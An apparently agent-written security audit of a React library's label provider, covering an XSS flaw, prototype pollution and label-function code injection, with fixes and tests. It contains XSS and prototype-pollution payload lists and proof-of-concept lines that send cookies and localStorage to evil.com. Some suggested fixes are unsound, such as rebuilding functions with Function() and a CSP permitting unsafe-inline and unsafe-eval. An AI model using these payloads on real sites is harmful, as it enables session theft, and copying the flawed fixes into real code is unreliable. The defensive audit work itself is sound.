# Security Vulnerability Analysis: Label Provider Components

**Analysis Date:** 2025-10-24
**Analyzed By:** Security Vulnerability Scanner Agent
**Target Components:** `/src/tedi/providers/label-provider/`
**Severity Scale:** Critical | High | Medium | Low | Informational

---

## Executive Summary

This security analysis examined the LabelProvider components within the TEDI Design System React library. The analysis covered five files: `label-provider.tsx`, `use-labels.tsx`, `labels-map.ts`, `labels-table.tsx`, and `label-provider.stories.tsx`.

**Overall Risk Level: MEDIUM**

### Key Findings Summary:
- **1 High Severity Vulnerability** - XSS vulnerability via dangerouslySetInnerHTML in labels-table.tsx
- **2 Medium Severity Issues** - Prototype pollution risk and arbitrary code execution via function labels
- **3 Low Priority Findings** - Information disclosure, missing input validation, and dependency risks

The primary concern is the use of `dangerouslySetInnerHTML` in the labels table component, which could enable Cross-Site Scripting (XSS) attacks if malicious content enters the description field. Additionally, the pattern of accepting arbitrary function labels creates potential code injection vectors.

---

## Critical/High Priority Vulnerabilities

### 1. XSS Vulnerability via dangerouslySetInnerHTML (HIGH)

**Location:** `/src/tedi/providers/label-provider/labels-table.tsx:59-62`

**CWE Classification:** CWE-79 (Improper Neutralization of Input During Web Page Generation)

**Code Snippet:**
```tsx
<p
  className="text-small"
  dangerouslySetInnerHTML={{
    __html: linkifyStr(original.description, { format: () => 'MUI Pickers', target: '_blank' }),
  }}
/>
```

**Description:**
The component uses React's `dangerouslySetInnerHTML` to render the `description` field after processing it through `linkifyStr`. While `linkifyStr` is designed to safely convert URLs to links, the use of `dangerouslySetInnerHTML` bypasses React's XSS protection mechanisms entirely. This creates a potential XSS vector if:
1. The `labels-map.ts` file is modified to include malicious HTML in descriptions
2. Custom labels are provided by developers that contain script tags or event handlers
3. The linkify-string library has vulnerabilities or is misconfigured

**Attack Vector:**
An attacker with the ability to modify label descriptions (either through malicious PRs, compromised build process, or by convincing developers to use malicious custom labels) could inject arbitrary JavaScript:

```typescript
// Malicious label injection example
const maliciousLabels = {
  'custom.label': {
    description: '<img src=x onerror="alert(document.cookie)">',
    et: 'Test',
    en: 'Test',
    ru: 'Test'
  }
};
```

**Impact Assessment:**
- **Confidentiality:** HIGH - XSS can steal authentication tokens, session cookies, and sensitive data
- **Integrity:** HIGH - Can modify page content, redirect users to phishing sites
- **Availability:** MEDIUM - Could crash the application or cause DoS
- **Scope:** Limited to Storybook documentation environment, but demonstrates unsafe pattern

**Proof of Concept:**
```typescript
// In labels-map.ts, if an attacker could inject:
'test.label': {
  description: '<img src=x onerror="fetch(\'https://evil.com/steal?cookie=\'+document.cookie)">',
  components: ['Test'],
  et: 'Test',
  en: 'Test',
  ru: 'Test',
}
```

**Remediation:**

**Option 1: Remove dangerouslySetInnerHTML (RECOMMENDED)**
```tsx
// Replace lines 56-63 in labels-table.tsx
columnHelper.accessor('description', {
  header: () => 'Description',
  cell: ({ row: { original } }) => (
    <p className="text-small">{original.description}</p>
  ),
})
```

**Option 2: Use DOMPurify for Sanitization (if HTML is required)**
```tsx
import DOMPurify from 'dompurify';

columnHelper.accessor('description', {
  header: () => 'Description',
  cell: ({ row: { original } }) => {
    const sanitizedHTML = DOMPurify.sanitize(
      linkifyStr(original.description, {
        format: () => 'MUI Pickers',
        target: '_blank',
        validate: {
          url: (value) => /^https?:\/\//.test(value) // Only allow http(s) URLs
        }
      }),
      {
        ALLOWED_TAGS: ['a'],
        ALLOWED_ATTR: ['href', 'target', 'rel'],
        ALLOWED_URI_REGEXP: /^https?:\/\//
      }
    );

    return (
      <p
        className="text-small"
        dangerouslySetInnerHTML={{ __html: sanitizedHTML }}
      />
    );
  },
})
```

Note: DOMPurify is already a devDependency (line 116 in package.json), so no additional installation needed.

**Option 3: Use React Component for Links (BEST PRACTICE)**
```tsx
columnHelper.accessor('description', {
  header: () => 'Description',
  cell: ({ row: { original } }) => {
    const description = original.description;
    const urlRegex = /(https?:\/\/[^\s]+)/g;
    const parts = description.split(urlRegex);

    return (
      <p className="text-small">
        {parts.map((part, index) => {
          if (part.match(urlRegex)) {
            return (
              <a
                key={index}
                href={part}
                target="_blank"
                rel="noopener noreferrer"
              >
                MUI Pickers
              </a>
            );
          }
          return <React.Fragment key={index}>{part}</React.Fragment>;
        })}
      </p>
    );
  },
})
```

**Prevention Best Practices:**
1. **Never use `dangerouslySetInnerHTML`** unless absolutely necessary and always sanitize
2. Use React's built-in XSS protection by rendering text as children
3. If links are needed, use `<a>` tags programmatically instead of innerHTML
4. Implement Content Security Policy (CSP) headers to mitigate XSS impact
5. Add ESLint rule to warn/error on `dangerouslySetInnerHTML` usage

---

## Medium Priority Vulnerabilities

### 2. Prototype Pollution Risk in Label Merging (MEDIUM)

**Location:** `/src/tedi/providers/label-provider/label-provider.tsx:81-106`

**CWE Classification:** CWE-1321 (Improperly Controlled Modification of Object Prototype Attributes)

**Code Snippet:**
```tsx
const mergedLabels = useMemo(() => {
  const result = {} as Record<string, string | LabelFunctionValue<any>>;
  const allKeys = new Set<string>([...Object.keys(labelsMap), ...Object.keys(labels)]);

  for (const k of allKeys) {
    const key = k as keyof TediLabels;
    // ... merging logic
    result[key] = newEntry ?? defaultEntry ?? key;
  }

  return result;
}, [labels, locale]);
```

**Description:**
The label merging logic iterates over all keys from both default labels and user-provided labels without sanitizing key names. If an attacker can control the `labels` prop (through developer error or malicious custom labels), they could inject prototype pollution keys like `__proto__`, `constructor`, or `prototype`.

While TypeScript provides some protection, at runtime JavaScript will still process these keys, potentially polluting the Object prototype chain.

**Attack Vector:**
```typescript
// Malicious label injection
<LabelProvider
  labels={{
    '__proto__': {
      en: 'polluted',
      et: 'polluted',
      ru: 'polluted'
    },
    'isAdmin': {
      en: true,
      et: true,
      ru: true
    }
  }}
>
  {/* Now Object.prototype.isAdmin === true for all objects */}
</LabelProvider>
```

**Impact Assessment:**
- **Confidentiality:** MEDIUM - Could expose internal state
- **Integrity:** HIGH - Could modify application behavior
- **Availability:** LOW - Unlikely to cause crashes
- **Scope:** Depends on application architecture and how labels are used

**Proof of Concept:**
```typescript
const maliciousLabels = {
  '__proto__': { en: 'hacked', et: 'hacked', ru: 'hacked' },
  'constructor': { en: 'hacked', et: 'hacked', ru: 'hacked' }
};

// After merging, all objects in the application could be affected
const obj = {};
console.log(obj.someProperty); // Could return unexpected values
```

**Remediation:**

```tsx
const mergedLabels = useMemo(() => {
  const result = Object.create(null) as Record<string, string | LabelFunctionValue<any>>;
  const dangerousKeys = ['__proto__', 'constructor', 'prototype'];

  const allKeys = new Set<string>([
    ...Object.keys(labelsMap),
    ...Object.keys(labels)
  ].filter(key => !dangerousKeys.includes(key)));

  for (const k of allKeys) {
    const key = k as keyof TediLabels;
    const defaultEntry = labelsMap[key] ? labelsMap[key][locale] : undefined;
    const customEntry = labels[key] ?? undefined;

    let newEntry;

    if (customEntry) {
      if (typeof customEntry === 'object' && customEntry !== null) {
        newEntry = customEntry[locale];
      } else {
        newEntry = customEntry;
      }
    } else {
      newEntry = undefined;
    }

    // Only set if key is safe
    if (Object.prototype.hasOwnProperty.call(result, key) || !dangerousKeys.includes(String(key))) {
      result[key] = newEntry ?? defaultEntry ?? key;
    }
  }

  return result;
}, [labels, locale]);
```

**Prevention Best Practices:**
1. Use `Object.create(null)` to create objects without prototype inheritance
2. Validate and sanitize all object keys before assignment
3. Implement a whitelist of allowed label keys
4. Add runtime validation to reject dangerous key names
5. Use TypeScript's strict mode and proper typing

### 3. Arbitrary Function Execution via Label Functions (MEDIUM)

**Location:** `/src/tedi/providers/label-provider/label-provider.tsx:132-134`

**CWE Classification:** CWE-94 (Improper Control of Generation of Code)

**Code Snippet:**
```tsx
if (typeof label === 'function') {
  return label(...args);
}
```

**Description:**
The `getLabel` function accepts and executes arbitrary functions provided by developers through the `labels` prop. While this is by design for parameterized labels (e.g., pluralization), it creates a code execution vector if an attacker can control label definitions.

The function is executed with user-provided arguments, potentially allowing:
1. Execution of malicious code
2. Access to the React component closure scope
3. Side effects like network requests or DOM manipulation

**Attack Vector:**
```typescript
// Malicious label with side effects
<LabelProvider
  labels={{
    'custom.label': {
      en: (count) => {
        // Exfiltrate data
        fetch('https://evil.com/log', {
          method: 'POST',
          body: JSON.stringify({
            cookies: document.cookie,
            localStorage: { ...localStorage },
            count: count
          })
        });
        return `Count: ${count}`;
      }
    }
  }}
>
```

**Impact Assessment:**
- **Confidentiality:** HIGH - Can access and exfiltrate sensitive data
- **Integrity:** HIGH - Can modify application state and behavior
- **Availability:** MEDIUM - Could cause performance issues or crashes
- **Scope:** Limited to developers who can provide custom labels

**Proof of Concept:**
```typescript
// In a component using the provider
const { getLabel } = useLabels();

// Attacker-controlled function executes
const result = getLabel('malicious.label', userData);
// Function can now access userData and perform malicious operations
```

**Remediation:**

**Option 1: Freeze Function Context (Partial Mitigation)**
```tsx
if (typeof label === 'function') {
  try {
    // Execute in strict mode with limited context
    const result = Function('"use strict"; return (' + label.toString() + ')(...arguments)')(...args);
    return String(result); // Ensure return value is always string
  } catch (error) {
    console.error(`Error executing label function for key "${key}":`, error);
    return key;
  }
}
```

**Option 2: Validate Function Source (RECOMMENDED)**
```tsx
const getLabel = useCallback(
  <TKey extends keyof TediLabels, TArgs extends /*...*/ []>(
    key: TKey,
    ...args: TArgs
  ): string => {
    const label = mergedLabels[key];

    if (!label) {
      console.error(`Label missing for key "${key}".`);
      return key;
    }

    if (typeof label === 'function') {
      // Validate function comes from trusted source
      const functionString = label.toString();

      // Check for suspicious patterns
      const suspiciousPatterns = [
        /fetch\(/,
        /XMLHttpRequest/,
        /document\.cookie/,
        /localStorage/,
        /sessionStorage/,
        /eval\(/,
        /Function\(/,
        /import\(/,
        /__proto__/,
        /constructor/
      ];

      if (suspiciousPatterns.some(pattern => pattern.test(functionString))) {
        console.error(`Suspicious label function detected for key "${key}". Using fallback.`);
        return key;
      }

      try {
        const result = label(...args);
        return typeof result === 'string' ? result : String(result);
      } catch (error) {
        console.error(`Error executing label function for key "${key}":`, error);
        return key;
      }
    }

    return label;
  },
  [mergedLabels]
);
```

**Option 3: Restrict to Template Strings (BEST PRACTICE)**
```typescript
// Update labels-map.ts type system to only allow template functions
type SafeLabelFunction<TArgs extends unknown[]> = (
  ...args: TArgs
) => string & { __brand: 'SafeLabelString' };

// Provide a safe template function factory
export const createLabelTemplate = <TArgs extends unknown[]>(
  template: (values: TArgs) => string
): SafeLabelFunction<TArgs> => {
  return ((...args: TArgs) => {
    const result = template(args);
    // Escape any HTML
    return result.replace(/[&<>"']/g, (char) => {
      const escapeMap: Record<string, string> = {
        '&': '&amp;',
        '<': '&lt;',
        '>': '&gt;',
        '"': '&quot;',
        "'": '&#39;'
      };
      return escapeMap[char];
    });
  }) as SafeLabelFunction<TArgs>;
};
```

**Prevention Best Practices:**
1. Document that custom label functions should not perform side effects
2. Add runtime validation to detect suspicious function code
3. Consider using template strings instead of functions where possible
4. Implement Content Security Policy (CSP) to restrict network access
5. Add unit tests to verify label functions don't have side effects
6. Use static analysis tools to scan for dangerous patterns in label functions

---

## Low Priority/Informational Findings

### 4. Information Disclosure via Console Errors (LOW)

**Location:** Multiple locations in `/src/tedi/providers/label-provider/label-provider.tsx`

**CWE Classification:** CWE-209 (Generation of Error Message Containing Sensitive Information)

**Code Snippets:**
```tsx
// Line 50
console.error('LabelProvider missing! Application must be wrapped with <LabelProvider>');

// Line 128
console.error(`Label missing for key "${key}".`);
```

**Description:**
The component logs error messages to the browser console when labels are missing or the provider is not properly configured. While this is helpful for developers, it could expose:
1. Internal application structure (label keys used)
2. Information about missing translations
3. Indication that internationalization is incomplete

**Impact Assessment:**
- **Confidentiality:** LOW - Minor information disclosure
- **Integrity:** NONE
- **Availability:** NONE
- **Scope:** Development and production environments

**Remediation:**

```tsx
// Create a logger utility
const logger = {
  error: (message: string, context?: Record<string, unknown>) => {
    if (process.env.NODE_ENV === 'development') {
      console.error(message, context);
    } else {
      // In production, use a proper error tracking service
      // Example: Sentry.captureMessage(message, { level: 'error', context });
    }
  }
};

// Usage
logger.error('LabelProvider missing!', {
  component: 'LabelContext',
  isTest: isTestEnvironment
});

logger.error('Label missing', {
  key: key,
  availableKeys: Object.keys(mergedLabels).slice(0, 10) // Limit exposure
});
```

**Prevention Best Practices:**
1. Use environment-aware logging
2. Avoid exposing internal key names in production
3. Implement proper error tracking (e.g., Sentry, Datadog)
4. Sanitize error messages before logging
5. Consider using error codes instead of descriptive messages

### 5. Missing Input Validation for Locale Parameter (LOW)

**Location:** `/src/tedi/providers/label-provider/label-provider.tsx:69,79,109`

**CWE Classification:** CWE-20 (Improper Input Validation)

**Code Snippet:**
```tsx
locale?: TediLanguage;
// ...
const { labels = {}, children, locale = 'en' } = props;
// ...
dayjs.locale(locale);
```

**Description:**
The `locale` prop accepts any `TediLanguage` value ('et' | 'en' | 'ru') but doesn't validate that the provided locale is actually supported by dayjs or that all required locale data is loaded. Invalid locale values could cause:
1. Fallback to unexpected locales
2. Inconsistent date formatting
3. Runtime errors if dayjs locale is not loaded

**Impact Assessment:**
- **Confidentiality:** NONE
- **Integrity:** LOW - Could show wrong date formats
- **Availability:** LOW - Potential for runtime errors
- **Scope:** Any component using date pickers

**Remediation:**

```tsx
const SUPPORTED_LOCALES: readonly TediLanguage[] = ['et', 'en', 'ru'] as const;
const DEFAULT_LOCALE: TediLanguage = 'en';

export const LabelProvider = <TRecord extends TediLabelEntryRecord<TRecord>>(
  props: LabelProviderProps<TRecord>
): JSX.Element => {
  const { labels = {}, children, locale: providedLocale = DEFAULT_LOCALE } = props;

  // Validate and sanitize locale
  const locale = SUPPORTED_LOCALES.includes(providedLocale)
    ? providedLocale
    : DEFAULT_LOCALE;

  if (providedLocale !== locale) {
    console.warn(
      `Unsupported locale "${providedLocale}" provided. Falling back to "${locale}". ` +
      `Supported locales: ${SUPPORTED_LOCALES.join(', ')}`
    );
  }

  // Verify dayjs locale is available
  useEffect(() => {
    try {
      dayjs.locale(locale);
      const currentLocale = dayjs.locale();
      if (currentLocale !== locale) {
        console.error(
          `Failed to set dayjs locale to "${locale}". ` +
          `Current locale is "${currentLocale}". ` +
          `Ensure dayjs locale data is imported.`
        );
      }
    } catch (error) {
      console.error(`Error setting dayjs locale to "${locale}":`, error);
    }
  }, [locale]);

  // Rest of component...
};
```

**Prevention Best Practices:**
1. Validate all enum/union type inputs at runtime
2. Provide clear error messages for invalid inputs
3. Use TypeScript's const assertions for strict typing
4. Document locale loading requirements
5. Add unit tests for invalid locale handling

### 6. Dependency Vulnerability Surface (INFORMATIONAL)

**Location:** Package dependencies in `/package.json`

**Relevant Dependencies:**
- `linkify-string: ^4.1.3` (devDependency)
- `dayjs: ^1.11.10` (peerDependency)
- `@mui/x-date-pickers: ^5.0.20`

**Description:**
The label provider relies on several third-party dependencies that could contain vulnerabilities:

1. **linkify-string** - Used in labels-table.tsx for URL detection and linking
2. **dayjs** - Used for internationalization and date formatting
3. **@mui/x-date-pickers** - Provides additional localization features

While no known critical vulnerabilities exist in these versions at the time of this analysis, dependencies should be regularly audited.

**Impact Assessment:**
- Depends on specific vulnerabilities in dependencies
- Could range from LOW to CRITICAL

**Remediation:**

1. **Implement Regular Dependency Audits:**
```bash
# Add to CI/CD pipeline
npm audit --audit-level=moderate
npm outdated
```

2. **Use Dependabot or Renovate:**
```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "weekly"
    open-pull-requests-limit: 10
    versioning-strategy: increase-if-necessary
```

3. **Pin Exact Versions for Security-Critical Dependencies:**
```json
{
  "dependencies": {
    "@mui/x-date-pickers": "5.0.20", // Exact version, not ^5.0.20
  },
  "devDependencies": {
    "linkify-string": "4.1.3" // Exact version
  }
}
```

4. **Consider Alternatives to linkify-string:**
Since linkify-string is only used in one Storybook component, consider replacing it with a simpler, more secure solution or removing the feature entirely.

**Prevention Best Practices:**
1. Run `npm audit` in CI/CD pipeline and fail builds on HIGH/CRITICAL vulnerabilities
2. Use tools like Snyk, WhiteSource, or GitHub Security Advisories
3. Keep dependencies up to date with automated tools
4. Review dependency changes in pull requests
5. Minimize dependency count where possible
6. Use lockfiles (package-lock.json) to ensure consistent installs

---

## Secure Code Recommendations

### 1. Implement a Secure Label Provider Wrapper

Create a hardened wrapper that validates and sanitizes all inputs:

```tsx
// src/tedi/providers/label-provider/secure-label-provider.tsx
import React from 'react';
import DOMPurify from 'dompurify';
import { LabelProvider, LabelProviderProps, TediLabelEntryRecord } from './label-provider';

const SUPPORTED_LOCALES = ['et', 'en', 'ru'] as const;
const DANGEROUS_KEYS = ['__proto__', 'constructor', 'prototype'];

/**
 * Validates that a label key is safe
 */
const isSafeLabelKey = (key: string): boolean => {
  return !DANGEROUS_KEYS.includes(key) &&
         !/^__/.test(key) && // No keys starting with __
         key.length < 100; // Reasonable key length limit
};

/**
 * Sanitizes label values
 */
const sanitizeLabelValue = (value: unknown): unknown => {
  if (typeof value === 'string') {
    // Remove any potentially dangerous HTML
    return DOMPurify.sanitize(value, { ALLOWED_TAGS: [] });
  }

  if (typeof value === 'function') {
    const functionString = value.toString();

    // Check for suspicious patterns
    const suspiciousPatterns = [
      /fetch\(/i,
      /XMLHttpRequest/i,
      /document\./i,
      /window\./i,
      /localStorage/i,
      /sessionStorage/i,
      /eval\(/i,
      /Function\(/i,
      /import\(/i,
      /require\(/i,
      /<script/i,
      /javascript:/i
    ];

    if (suspiciousPatterns.some(pattern => pattern.test(functionString))) {
      console.error('Suspicious label function detected and blocked');
      return () => '[BLOCKED]';
    }

    return value;
  }

  if (typeof value === 'object' && value !== null) {
    const sanitized: Record<string, unknown> = {};
    for (const [k, v] of Object.entries(value)) {
      if (isSafeLabelKey(k)) {
        sanitized[k] = sanitizeLabelValue(v);
      }
    }
    return sanitized;
  }

  return value;
};

/**
 * Secure wrapper for LabelProvider that validates and sanitizes inputs
 */
export const SecureLabelProvider = <TRecord extends TediLabelEntryRecord<TRecord>>(
  props: LabelProviderProps<TRecord>
): JSX.Element => {
  const { labels, locale, children } = props;

  // Validate locale
  const validatedLocale = (locale && SUPPORTED_LOCALES.includes(locale as any))
    ? locale
    : 'en';

  // Sanitize labels
  const sanitizedLabels = React.useMemo(() => {
    if (!labels || typeof labels !== 'object') {
      return {};
    }

    const sanitized: Record<string, unknown> = {};

    for (const [key, value] of Object.entries(labels)) {
      if (isSafeLabelKey(key)) {
        sanitized[key] = sanitizeLabelValue(value);
      } else {
        console.warn(`Blocked potentially dangerous label key: ${key}`);
      }
    }

    return sanitized as TRecord;
  }, [labels]);

  return (
    <LabelProvider
      locale={validatedLocale}
      labels={sanitizedLabels}
    >
      {children}
    </LabelProvider>
  );
};
```

### 2. Add Type Guards and Runtime Validation

```tsx
// src/tedi/providers/label-provider/validation.ts
import { TediLanguage, TediLabelValuesRecord } from './labels-map';

export const isTediLanguage = (value: unknown): value is TediLanguage => {
  return typeof value === 'string' && ['et', 'en', 'ru'].includes(value);
};

export const validateLabelRecord = (
  labels: unknown
): labels is TediLabelValuesRecord => {
  if (typeof labels !== 'object' || labels === null) {
    return false;
  }

  for (const [key, value] of Object.entries(labels)) {
    // Validate key format
    if (typeof key !== 'string' || key.length === 0 || key.length > 100) {
      console.error(`Invalid label key: ${key}`);
      return false;
    }

    // Validate value
    if (
      typeof value !== 'string' &&
      typeof value !== 'function' &&
      (typeof value !== 'object' || value === null)
    ) {
      console.error(`Invalid label value for key ${key}`);
      return false;
    }
  }

  return true;
};
```

### 3. Implement Content Security Policy (CSP)

Add CSP headers to prevent XSS exploitation:

```typescript
// For Next.js applications using this library
// next.config.js
const ContentSecurityPolicy = `
  default-src 'self';
  script-src 'self' 'unsafe-eval' 'unsafe-inline';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  font-src 'self' data:;
  connect-src 'self';
  frame-ancestors 'none';
  base-uri 'self';
  form-action 'self';
`;

module.exports = {
  async headers() {
    return [
      {
        source: '/:path*',
        headers: [
          {
            key: 'Content-Security-Policy',
            value: ContentSecurityPolicy.replace(/\s{2,}/g, ' ').trim()
          },
          {
            key: 'X-Frame-Options',
            value: 'DENY'
          },
          {
            key: 'X-Content-Type-Options',
            value: 'nosniff'
          },
          {
            key: 'Referrer-Policy',
            value: 'strict-origin-when-cross-origin'
          }
        ]
      }
    ];
  }
};
```

### 4. Add ESLint Security Rules

```json
// .eslintrc.json additions
{
  "rules": {
    "react/no-danger": "error",
    "react/no-danger-with-children": "error",
    "no-eval": "error",
    "no-implied-eval": "error",
    "no-new-func": "error",
    "no-script-url": "error"
  },
  "plugins": [
    "react",
    "security"
  ],
  "extends": [
    "plugin:security/recommended"
  ]
}
```

### 5. Create Security-Focused Unit Tests

```tsx
// src/tedi/providers/label-provider/__tests__/security.spec.tsx
import { render, screen } from '@testing-library/react';
import React from 'react';
import { LabelProvider } from '../label-provider';
import { useLabels } from '../use-labels';

describe('LabelProvider Security Tests', () => {
  it('should not execute XSS in label values', () => {
    const maliciousLabel = '<script>alert("XSS")</script>';
    const Component = () => {
      const { getLabel } = useLabels();
      return <div>{getLabel('test.label' as any)}</div>;
    };

    const { container } = render(
      <LabelProvider labels={{ 'test.label': { en: maliciousLabel } }}>
        <Component />
      </LabelProvider>
    );

    // Script tags should not be executed or present in DOM
    expect(container.querySelector('script')).toBeNull();
    expect(container.innerHTML).not.toContain('<script>');
  });

  it('should not allow prototype pollution via label keys', () => {
    const originalPrototype = Object.prototype;

    render(
      <LabelProvider
        labels={{
          '__proto__': { en: 'polluted', et: 'polluted', ru: 'polluted' }
        } as any}
      >
        <div>Test</div>
      </LabelProvider>
    );

    // Prototype should not be polluted
    expect((Object.prototype as any).polluted).toBeUndefined();
    expect(Object.prototype).toBe(originalPrototype);
  });

  it('should sanitize function labels for suspicious content', () => {
    const maliciousFunction = () => {
      document.cookie = 'stolen=true';
      return 'Malicious';
    };

    const consoleSpy = jest.spyOn(console, 'error').mockImplementation();

    const Component = () => {
      const { getLabel } = useLabels();
      return <div>{getLabel('test.function' as any, 1)}</div>;
    };

    render(
      <LabelProvider
        labels={{
          'test.function': { en: maliciousFunction }
        } as any}
      >
        <Component />
      </LabelProvider>
    );

    // Cookie should not be set
    expect(document.cookie).not.toContain('stolen=true');

    consoleSpy.mockRestore();
  });

  it('should validate locale parameter', () => {
    const consoleSpy = jest.spyOn(console, 'warn').mockImplementation();

    render(
      <LabelProvider locale={'invalid' as any}>
        <div>Test</div>
      </LabelProvider>
    );

    // Should either reject or warn about invalid locale
    expect(consoleSpy).toHaveBeenCalled();

    consoleSpy.mockRestore();
  });

  it('should handle extremely long label keys gracefully', () => {
    const longKey = 'a'.repeat(10000);

    const Component = () => {
      const { getLabel } = useLabels();
      return <div>{getLabel(longKey as any)}</div>;
    };

    // Should not crash or cause performance issues
    expect(() => {
      render(
        <LabelProvider labels={{ [longKey]: { en: 'test' } } as any}>
          <Component />
        </LabelProvider>
      );
    }).not.toThrow();
  });
});
```

---

## Security Testing Recommendations

### 1. Manual Security Testing Checklist

- [ ] Test with malicious HTML in label descriptions
- [ ] Attempt XSS via `<script>`, `<img onerror>`, `<iframe>`, etc.
- [ ] Try prototype pollution with `__proto__`, `constructor`, `prototype` keys
- [ ] Test with malicious function labels that make network requests
- [ ] Verify CSP headers are properly set in production
- [ ] Test with invalid locales and special characters
- [ ] Attempt SQL injection via label keys (if backend involved)
- [ ] Test with extremely large label objects (DoS)
- [ ] Verify error messages don't expose sensitive information in production

### 2. Automated Security Scanning

Integrate these tools into CI/CD:

```yaml
# .github/workflows/security.yml
name: Security Scan

on:
  pull_request:
  push:
    branches: [rc, main]
  schedule:
    - cron: '0 0 * * 0' # Weekly

jobs:
  security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3

      - name: Run npm audit
        run: npm audit --audit-level=moderate

      - name: Run Snyk security scan
        uses: snyk/actions/node@master
        env:
          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}

      - name: Run ESLint security plugin
        run: npm run lint

      - name: Run OWASP Dependency Check
        uses: dependency-check/Dependency-Check_Action@main
        with:
          project: 'react-claude-prompt'
          path: '.'
          format: 'HTML'

      - name: Upload security scan results
        uses: actions/upload-artifact@v3
        with:
          name: security-reports
          path: |
            dependency-check-report.html
            snyk-report.json
```

### 3. Penetration Testing Scenarios

**Scenario 1: XSS via Labels**
```typescript
// Test Case: Can we inject JavaScript?
const xssPayloads = [
  '<script>alert(1)</script>',
  '<img src=x onerror=alert(1)>',
  '<svg onload=alert(1)>',
  'javascript:alert(1)',
  '<iframe src="javascript:alert(1)">',
  '<body onload=alert(1)>',
  '<input onfocus=alert(1) autofocus>',
  '<select onfocus=alert(1) autofocus>',
  '<textarea onfocus=alert(1) autofocus>',
  '<marquee onstart=alert(1)>',
  '<details open ontoggle=alert(1)>'
];

xssPayloads.forEach(payload => {
  testLabelProvider({
    'test.label': {
      description: payload,
      en: payload,
      et: payload,
      ru: payload
    }
  });
});
```

**Scenario 2: Prototype Pollution**
```typescript
// Test Case: Can we pollute Object.prototype?
const pollutionPayloads = [
  { '__proto__': { isAdmin: true } },
  { 'constructor': { prototype: { isAdmin: true } } },
  { '__proto__.isAdmin': true },
  { 'constructor.prototype.isAdmin': true }
];

pollutionPayloads.forEach(payload => {
  testLabelProvider({ labels: payload });

  // Check if pollution occurred
  const testObj = {};
  console.assert(!(testObj as any).isAdmin, 'Prototype pollution detected!');
});
```

**Scenario 3: Code Injection via Functions**
```typescript
// Test Case: Can we execute arbitrary code?
const codeInjectionPayloads = [
  (x: number) => { fetch('http://evil.com?data=' + document.cookie); return String(x); },
  (x: number) => { eval('alert(1)'); return String(x); },
  (x: number) => { new Function('alert(1)')(); return String(x); },
  (x: number) => { window.location = 'http://evil.com'; return String(x); },
  (x: number) => { localStorage.setItem('hacked', 'true'); return String(x); }
];

codeInjectionPayloads.forEach(payload => {
  testLabelProvider({
    'test.label': {
      en: payload,
      et: payload,
      ru: payload
    }
  });
});
```

### 4. Fuzzing Test Cases

```typescript
// Fuzz testing for unexpected inputs
import { faker } from '@faker-js/faker';

describe('LabelProvider Fuzz Testing', () => {
  it('should handle random string inputs', () => {
    for (let i = 0; i < 100; i++) {
      const randomLabel = faker.lorem.words(Math.floor(Math.random() * 50));
      expect(() => {
        render(
          <LabelProvider labels={{ 'fuzz.test': { en: randomLabel } } as any}>
            <div>Test</div>
          </LabelProvider>
        );
      }).not.toThrow();
    }
  });

  it('should handle random function inputs', () => {
    for (let i = 0; i < 100; i++) {
      const randomFunction = () => faker.lorem.sentence();
      expect(() => {
        render(
          <LabelProvider labels={{ 'fuzz.test': { en: randomFunction } } as any}>
            <div>Test</div>
          </LabelProvider>
        );
      }).not.toThrow();
    }
  });
});
```

---

## Additional Security Considerations

### 1. Supply Chain Security

**Recommendation:** Implement Subresource Integrity (SRI) and verify package signatures

```bash
# Verify package integrity
npm audit signatures

# Use npm ci instead of npm install in CI/CD
npm ci --ignore-scripts
```

### 2. Secure Development Practices

**Code Review Checklist for Label-Related Changes:**
- [ ] No use of `dangerouslySetInnerHTML` without DOMPurify
- [ ] All user inputs are validated and sanitized
- [ ] No prototype pollution vulnerabilities
- [ ] Function labels don't perform side effects
- [ ] Error messages don't expose sensitive information
- [ ] Locale parameter is validated
- [ ] Dependencies are up to date
- [ ] Security tests are included

### 3. Security Documentation

Create a SECURITY.md file in the repository:

```markdown
# Security Policy

## Supported Versions

| Version | Supported          |
| ------- | ------------------ |
| 14.x    | :white_check_mark: |
| < 14.0  | :x:                |

## Reporting a Vulnerability

**DO NOT** create public GitHub issues for security vulnerabilities.

Instead, email security@tedi-design-system.com with:
- Description of the vulnerability
- Steps to reproduce
- Potential impact
- Suggested fix (if any)

We will respond within 48 hours.

## Security Considerations for LabelProvider

When using custom labels:
1. Never use user input directly in label values
2. Avoid side effects in label functions
3. Sanitize any HTML content
4. Use the provided SecureLabelProvider for sensitive applications
5. Keep dependencies updated

See security-findings-label-provider.md for detailed security analysis.
```

### 4. Threat Modeling Summary

**Assets:**
- User session data and cookies
- Application state and configuration
- Translated strings and labels
- Date formatting preferences

**Threat Actors:**
- Malicious internal developers
- Compromised dependencies
- Social engineering attacks targeting label contributions
- Automated bots exploiting XSS vulnerabilities

**Attack Surface:**
- LabelProvider props (labels, locale)
- Storybook documentation (labels-table.tsx)
- Custom label functions
- Third-party dependencies

**Mitigations:**
- Input validation and sanitization
- Content Security Policy
- Regular dependency audits
- Security-focused code reviews
- Automated security testing

---

## Conclusion

The label provider components have a **MEDIUM overall security risk** with one HIGH severity XSS vulnerability that should be addressed immediately. The primary concerns are:

1. **Immediate Action Required:** Remove `dangerouslySetInnerHTML` from labels-table.tsx or implement proper sanitization
2. **Short-term Improvements:** Add prototype pollution protection and function validation
3. **Long-term Enhancements:** Implement comprehensive security testing and monitoring

The good news is that most vulnerabilities are contained within the Storybook documentation layer (`labels-table.tsx`) and don't directly affect production applications using the library. However, the patterns demonstrated could be replicated elsewhere, making it important to establish secure coding practices now.

### Priority Action Items:

1. **HIGH:** Fix XSS in labels-table.tsx (1-2 hours)
2. **MEDIUM:** Add prototype pollution protection (2-4 hours)
3. **MEDIUM:** Implement function validation (2-4 hours)
4. **LOW:** Add security tests (4-8 hours)
5. **LOW:** Set up automated security scanning (4 hours)

### Estimated Remediation Time:
- Critical fixes: 1-2 days
- Full security hardening: 1-2 weeks
- Ongoing maintenance: 2-4 hours per month

---

## References

- **OWASP Top 10 2021:** https://owasp.org/Top10/
- **CWE Database:** https://cwe.mitre.org/
- **React Security Best Practices:** https://reactjs.org/docs/dom-elements.html#dangerouslysetinnerhtml
- **Prototype Pollution:** https://portswigger.net/daily-swig/prototype-pollution
- **DOMPurify Documentation:** https://github.com/cure53/DOMPurify
